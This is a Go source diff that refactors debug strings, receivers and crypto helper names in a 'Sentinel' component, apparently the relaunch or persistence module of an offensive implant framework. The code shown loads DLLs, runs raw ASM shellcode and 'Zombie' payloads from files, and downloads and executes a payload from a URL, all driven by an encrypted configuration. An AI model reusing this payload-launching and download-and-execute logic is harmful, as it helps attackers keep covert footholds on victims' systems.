@@ -126,14 +126,14 @@ func (s *Sentinel) read(r io.Reader) error {
 func (s *Sentinel) write(w io.Writer) error {
 	return s.MarshalStream(data.NewWriter(w))
 }
-func (p *sentinelPath) run(f *filter.Filter) error {
+func (p sentinelPath) run(f *filter.Filter) error {
 	if bugtrack.Enabled {
-		bugtrack.Track("man.sentinelPath.run(): Running p.t=%d, p.path=%s", p.t, p.path)
+		bugtrack.Track("man.(sentinelPath).run(): Running p.t=%d, p.path=%s", p.t, p.path)
 	}
 	switch p.t {
 	case sentPathDLL:
 		if bugtrack.Enabled {
-			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a DLL", p.t, p.path)
+			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a DLL", p.t, p.path)
 		}
 		x := cmd.NewDLL(p.path)
 		x.SetParent(f)
@@ -142,7 +142,7 @@ func (p *sentinelPath) run(f *filter.Filter) error {
 		return err
 	case sentPathASM:
 		if bugtrack.Enabled {
-			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is ASM", p.t, p.path)
+			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is ASM", p.t, p.path)
 		}
 		b, err := os.ReadFile(p.path)
 		if err != nil {
@@ -155,7 +155,7 @@ func (p *sentinelPath) run(f *filter.Filter) error {
 		return err
 	case sentPathZombie:
 		if bugtrack.Enabled {
-			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a Zombie", p.t, p.path)
+			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a Zombie", p.t, p.path)
 		}
 		b, err := os.ReadFile(p.path)
 		if err != nil {
@@ -181,7 +181,7 @@ func (p *sentinelPath) run(f *filter.Filter) error {
 		var x *cmd.Process
 		if p.path == Self {
 			if bugtrack.Enabled {
-				bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is Self", p.t, p.path)
+				bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is Self", p.t, p.path)
 			}
 			e, err := os.Executable()
 			if err != nil {
@@ -190,7 +190,7 @@ func (p *sentinelPath) run(f *filter.Filter) error {
 			x = cmd.NewProcess(e)
 		} else {
 			if bugtrack.Enabled {
-				bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a Command", p.t, p.path)
+				bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a Command", p.t, p.path)
 			}
 			x = cmd.NewProcess(cmd.Split(p.path)...)
 		}
@@ -202,7 +202,7 @@ func (p *sentinelPath) run(f *filter.Filter) error {
 		return err
 	case sentPathDownload:
 		if bugtrack.Enabled {
-			bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is a Download", p.t, p.path)
+			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a Download", p.t, p.path)
 		}
 		var a string
 		switch {
@@ -211,19 +211,19 @@ func (p *sentinelPath) run(f *filter.Filter) error {
 		case len(p.extra) == 1:
 			a = p.extra[0]
 		}
-		x, p, err := WebExec(context.Background(), nil, p.path, a)
+		x, v, err := WebExec(context.Background(), nil, p.path, a)
 		if err != nil {
 			return err
 		}
 		x.SetParent(f)
-		if err = x.Start(); err != nil && len(p) > 0 {
-			os.Remove(p)
+		if err = x.Start(); err != nil && len(v) > 0 {
+			os.Remove(v)
 		}
 		x.Release()
 		return err
 	}
 	if bugtrack.Enabled {
-		bugtrack.Track("man.sentinelPath.run(): p.t=%d, p.path=%s is unknown!", p.t, p.path)
+		bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is unknown!", p.t, p.path)
 	}
 	return cmd.ErrNotStarted
 }
@@ -385,25 +385,25 @@ func (s *Sentinel) Find(l Linker, n string) (bool, error) {
 			continue
 		}
 		if bugtrack.Enabled {
-			bugtrack.Track("man.Sentinel.Find(): n=%s, i=%d, s.paths[i].t=%d", n, i, s.paths[i].t)
+			bugtrack.Track("man.(*Sentinel).Find(): n=%s, i=%d, s.paths[i].t=%d", n, i, s.paths[i].t)
 		}
 		if err = s.paths[i].run(f); err != nil {
 			if bugtrack.Enabled {
-				bugtrack.Track("man.Sentinel.Find(): n=%s, i=%d, s.paths[i].t=%d, err=%s", n, i, s.paths[i].t, err)
+				bugtrack.Track("man.(*Sentinel).Find(): n=%s, i=%d, s.paths[i].t=%d, err=%s", n, i, s.paths[i].t, err.Error())
 			}
 			continue
 		}
 		if bugtrack.Enabled {
-			bugtrack.Track("man.Sentinel.Find(): Wake passed, no errors. Checking l.(type)=%T, n=%s now.", l, n)
+			bugtrack.Track("man.(*Sentinel).Find(): Wake passed, no errors. Checking l.(type)=%T, n=%s now.", l, n)
 		}
 		if time.Sleep(timeout); !Check(l, n) {
 			if bugtrack.Enabled {
-				bugtrack.Track("man.Sentinel.Find(): Wake l.(type)=%T, n=%s failed.", l, n)
+				bugtrack.Track("man.(*Sentinel).Find(): Wake l.(type)=%T, n=%s failed.", l, n)
 			}
 			continue
 		}
 		if bugtrack.Enabled {
-			bugtrack.Track("man.Sentinel.Find(): Wake l.(type)=%T, n=%s passed!", l, n)
+			bugtrack.Track("man.(*Sentinel).Find(): Wake l.(type)=%T, n=%s passed!", l, n)
 		}
 		return true, nil
 	}
@@ -448,7 +448,7 @@ func (s *Sentinel) Read(c cipher.Block, r io.Reader) error {
 	if n != c.BlockSize() {
 		return io.ErrUnexpectedEOF
 	}
-	i, err := crypto.Decrypter(c, k, r)
+	i, err := crypto.NewBlockReader(c, k, r)
 	if err != nil {
 		return err
 	}
@@ -490,7 +490,7 @@ func (s *Sentinel) Write(c cipher.Block, w io.Writer) error {
 	if n != c.BlockSize() {
 		return io.ErrShortWrite
 	}
-	o, err := crypto.Encrypter(c, k, w)
+	o, err := crypto.NewBlockWriter(c, k, w)
 	if err != nil {
 		return err
 	}
